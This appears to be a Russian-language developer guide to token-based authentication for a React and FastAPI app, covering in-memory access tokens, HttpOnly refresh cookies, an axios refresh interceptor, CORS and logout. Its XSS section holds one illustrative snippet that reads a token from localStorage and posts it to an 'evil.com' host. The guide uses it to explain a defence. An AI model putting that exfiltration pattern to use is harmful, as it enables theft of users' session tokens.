# Безопасность и Аутентификация

## 🔐 Обзор системы безопасности

Эта система реализует **современный и безопасный** подход к аутентификации с использованием:

1. **Access Token** - хранится только в памяти (React Context)
2. **Refresh Token** - хранится в HttpOnly cookie на сервере
3. **Автоматическое обновление токенов** без участия пользователя
4. **Защита от XSS** - токены недоступны из JavaScript
5. **Защита от CSRF** - SameSite cookie policy

---

## 📋 Архитектура аутентификации

### Поток аутентификации

```
1. Пользователь вводит логин/пароль
   ↓
2. POST /api/v1/auth/login (credentials)
   ↓
3. Сервер возвращает:
   - access_token в теле ответа (JSON)
   - refresh_token в HttpOnly cookie
   ↓
4. Frontend сохраняет access_token ТОЛЬКО В ПАМЯТИ
   ↓
5. При каждом запросе добавляется:
   Authorization: Bearer <access_token>
   ↓
6. Когда access_token истекает (400/EXPIRED_TOKEN):
   - Автоматический POST /api/v1/auth/refresh
   - Сервер читает refresh_token из cookie
   - Возвращает новый access_token
   - Повторяет исходный запрос
```

---

## 🛡️ Реализация

### 1. Хранение Access Token (ТОЛЬКО в памяти)

**❌ НЕ ДЕЛАЙТЕ ТАК:**
```typescript
// НЕТ localStorage!
localStorage.setItem('access_token', token);

// НЕТ sessionStorage!
sessionStorage.setItem('access_token', token);
```

**✅ ДЕЛАЙТЕ ТАК:**
```typescript
// /src/api/tokenManager.ts
class TokenManager {
  private accessToken: string | null = null; // ТОЛЬКО в памяти!

  setAccessToken(token: string): void {
    this.accessToken = token;
  }

  getAccessToken(): string | null {
    return this.accessToken;
  }
}

export const tokenManager = new TokenManager();
```

### 2. Refresh Token в HttpOnly Cookie

**Backend (FastAPI):**
```python
@router.post("/auth/login")
async def login(response: Response, credentials: LoginRequest):
    # Authenticate user
    user = authenticate(credentials)
    
    # Generate tokens
    access_token = create_access_token(user.id)
    refresh_token = create_refresh_token(user.id)
    
    # Set refresh_token in HttpOnly cookie
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,      # Не читается из JavaScript
        secure=True,        # Только HTTPS (production)
        samesite="strict",  # CSRF защита
        max_age=7*24*60*60, # 7 дней
        path="/"            # Доступен для всех путей
    )
    
    # Return access_token in body
    return {"access_token": access_token, "token_type": "bearer"}
```

**Frontend НЕ читает cookie:**
```typescript
// ❌ НИКОГДА не пытайтесь читать HttpOnly cookie из JS
document.cookie; // Не содержит refresh_token (это хорошо!)

// ✅ При refresh просто отправляем credentials: 'include'
await axios.post('/api/v1/auth/refresh', {}, {
  withCredentials: true // Браузер автоматически отправит cookie
});
```

### 3. Axios Interceptor для автоматического refresh

**Файл: /src/api/axiosInstance.ts**

```typescript
import axios from 'axios';
import { tokenManager } from './tokenManager';

const axiosInstance = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true, // КРИТИЧНО для cookie
});

// Request interceptor - добавляет access token
axiosInstance.interceptors.request.use((config) => {
  const token = tokenManager.getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// Response interceptor - обрабатывает expired token
let isRefreshing = false;
let failedQueue = [];

axiosInstance.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;
    
    // Проверяем нужен ли refresh
    if (
      error.response?.status === 400 &&
      error.response?.data?.error?.code === 'EXPIRED_TOKEN' &&
      !originalRequest._retry
    ) {
      if (isRefreshing) {
        // Добавляем в очередь если refresh уже в процессе
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Refresh токен
        const response = await axios.post(
          '/api/v1/auth/refresh',
          {},
          { withCredentials: true } // Отправляем refresh cookie
        );

        const { access_token } = response.data;
        tokenManager.setAccessToken(access_token);

        // Обрабатываем очередь
        failedQueue.forEach((prom) => prom.resolve(access_token));
        failedQueue = [];

        // Повторяем исходный запрос
        originalRequest.headers.Authorization = `Bearer ${access_token}`;
        return axiosInstance(originalRequest);
      } catch (refreshError) {
        // Refresh failed - logout
        failedQueue.forEach((prom) => prom.reject(refreshError));
        failedQueue = [];
        tokenManager.clearAccessToken();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

### 4. AuthContext для глобального состояния

**Файл: /src/api/auth/AuthContext.tsx**

```typescript
import { createContext, useState, useEffect } from 'react';
import { tokenManager } from '../tokenManager';
import { authApi, usersApi } from '../client';

interface AuthContextType {
  user: UserResponse | null;
  isAuthenticated: boolean;
  login: (credentials: LoginRequest) => Promise<void>;
  logout: () => Promise<void>;
}

export const AuthContext = createContext<AuthContextType | undefined>(undefined);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);

  useEffect(() => {
    // При загрузке пытаемся получить пользователя
    const loadUser = async () => {
      if (tokenManager.isAuthenticated()) {
        try {
          const userData = await usersApi.getMe();
          setUser(userData);
        } catch (error) {
          // Если не удалось, пробуем refresh
          try {
            await authApi.refresh();
            const userData = await usersApi.getMe();
            setUser(userData);
          } catch {
            tokenManager.clearAccessToken();
          }
        }
      }
    };
    loadUser();
  }, []);

  const login = async (credentials) => {
    const response = await authApi.login(credentials);
    tokenManager.setAccessToken(response.access_token);
    const userData = await usersApi.getMe();
    setUser(userData);
  };

  const logout = async () => {
    await authApi.logout();
    tokenManager.clearAccessToken();
    setUser(null);
  };

  return (
    <AuthContext.Provider value={{ user, isAuthenticated: !!user, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be within AuthProvider');
  return context;
}
```

### 5. Protected Routes

**Файл: /src/api/auth/ProtectedRoute.tsx**

```typescript
import { Navigate } from 'react-router';
import { useAuth } from './AuthContext';

export function ProtectedRoute({ children }) {
  const { isAuthenticated, isLoading } = useAuth();

  if (isLoading) {
    return <div>Loading...</div>;
  }

  if (!isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return children;
}
```

**Использование в routes:**
```typescript
import { ProtectedRoute } from './api/auth';

const routes = [
  {
    path: '/',
    element: (
      <ProtectedRoute>
        <HomePage />
      </ProtectedRoute>
    ),
  },
];
```

---

## 🔒 Защита от атак

### 1. XSS (Cross-Site Scripting)

**Защита:**
- ✅ Access token в памяти (не доступен через `document.cookie`)
- ✅ Refresh token в HttpOnly cookie (не читается из JS)
- ✅ Никакие токены не хранятся в localStorage/sessionStorage

**Почему localStorage небезопасен:**
```javascript
// Если есть XSS уязвимость, злоумышленник может:
const stolenToken = localStorage.getItem('access_token');
fetch('https://evil.com/steal', { 
  method: 'POST', 
  body: stolenToken 
});

// С нашим подходом это невозможно!
tokenManager.getAccessToken(); // undefined для внешнего кода
```

### 2. CSRF (Cross-Site Request Forgery)

**Защита:**
- ✅ SameSite=Strict cookie policy
- ✅ Refresh token отправляется только с нашего домена
- ✅ Access token в Authorization header (не в cookie)

**Backend настройка:**
```python
response.set_cookie(
    key="refresh_token",
    value=refresh_token,
    samesite="strict",  # Блокирует cross-site запросы
    httponly=True,
    secure=True
)
```

### 3. Token Replay Attacks

**Защита:**
- ✅ Короткий TTL для access token (5-15 минут)
- ✅ Длинный TTL для refresh token (7-30 дней)
- ✅ При logout - invalidate refresh token на сервере

---

## 🌐 CORS и Credentials

### Frontend (.env)
```env
VITE_API_BASE_URL=https://api.yourapp.com
```

### Backend (FastAPI)
```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://yourapp.com"],  # Ваш frontend домен
    allow_credentials=True,  # КРИТИЧНО для cookie
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### Axios
```typescript
const axiosInstance = axios.create({
  baseURL: API_BASE_URL,
  withCredentials: true, // КРИТИЧНО для отправки cookie
});
```

---

## 📊 Сравнение подходов

| Подход | XSS | CSRF | Простота | Безопасность |
|--------|-----|------|----------|--------------|
| localStorage | ❌ Уязвим | ✅ Защищен | ✅ Просто | ⚠️ Низкая |
| sessionStorage | ❌ Уязвим | ✅ Защищен | ✅ Просто | ⚠️ Низкая |
| Cookie (не HttpOnly) | ❌ Уязвим | ❌ Уязвим | ✅ Просто | ❌ Очень низкая |
| **Memory + HttpOnly Cookie** | ✅ Защищен | ✅ Защищен | ⚠️ Средне | ✅ **Высокая** |

---

## 🔄 Logout процесс

### Frontend
```typescript
const logout = async () => {
  try {
    // 1. Вызываем endpoint (сервер удалит refresh cookie)
    await authApi.logout();
  } finally {
    // 2. Очищаем access token из памяти
    tokenManager.clearAccessToken();
    
    // 3. Очищаем состояние пользователя
    setUser(null);
    
    // 4. Редирект на login
    navigate('/login');
  }
};
```

### Backend
```python
@router.post("/auth/logout")
async def logout(response: Response):
    # Удаляем refresh_token cookie
    response.delete_cookie(
        key="refresh_token",
        path="/",
        samesite="strict",
        httponly=True,
        secure=True
    )
    
    # Опционально: invalidate refresh token в БД
    # await db.invalidate_refresh_token(current_user.id)
    
    return Response(status_code=204)
```

---

## 🚨 Важные замечания

### ❌ Что НЕ делать

1. **Не храните токены в localStorage/sessionStorage**
   ```typescript
   // ❌ НИКОГДА
   localStorage.setItem('token', accessToken);
   ```

2. **Не читайте HttpOnly cookie из JavaScript**
   ```typescript
   // ❌ НЕ РАБОТАЕТ (и это хорошо!)
   const token = document.cookie.match(/refresh_token=([^;]+)/);
   ```

3. **Не отправляйте токены в query params**
   ```typescript
   // ❌ НЕБЕЗОПАСНО
   fetch(`/api/data?token=${accessToken}`);
   ```

### ✅ Что делать

1. **Всегда используйте HTTPS в production**
   - Без HTTPS cookie могут быть перехвачены

2. **Используйте короткий TTL для access token**
   - Рекомендуется 5-15 минут

3. **Включайте credentials в запросах**
   ```typescript
   // ✅ Для axios
   withCredentials: true
   
   // ✅ Для fetch
   credentials: 'include'
   ```

4. **Обрабатывайте параллельные refresh**
   - Используйте очередь запросов (failedQueue)

---

## 📱 Мобильные приложения

Для React Native / мобильных приложений:

```typescript
// Можно использовать secure storage
import * as SecureStore from 'expo-secure-store';

await SecureStore.setItemAsync('access_token', token);
const token = await SecureStore.getItemAsync('access_token');
```

Но для веб-приложений - **только память!**

---

## 🔍 Debugging

### Проверка cookie в DevTools

1. Откройте DevTools → Application → Cookies
2. Найдите `refresh_token`
3. Проверьте флаги:
   - ✅ HttpOnly: true
   - ✅ Secure: true (в production)
   - ✅ SameSite: Strict

### Проверка access token

```typescript
// В консоли (только для debugging!)
import { tokenManager } from './api/tokenManager';
console.log(tokenManager.getAccessToken());
```

### Network Tab

При refresh запросе вы должны видеть:
```
POST /api/v1/auth/refresh
Cookie: refresh_token=xxx (автоматически)
Response: {"access_token": "yyy"}
```

---

## 📝 Checklist безопасности

- [ ] Access token хранится ТОЛЬКО в памяти
- [ ] Refresh token в HttpOnly cookie
- [ ] SameSite=Strict для cookie
- [ ] Secure=True в production
- [ ] CORS настроен правильно
- [ ] withCredentials: true в axios
- [ ] Автоматический refresh работает
- [ ] Очередь запросов при refresh
- [ ] Logout очищает токены
- [ ] HTTPS в production

---

## 🎓 Дополнительные ресурсы

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

**Помните**: Безопасность - это не одноразовая задача, а постоянный процесс! 🛡️
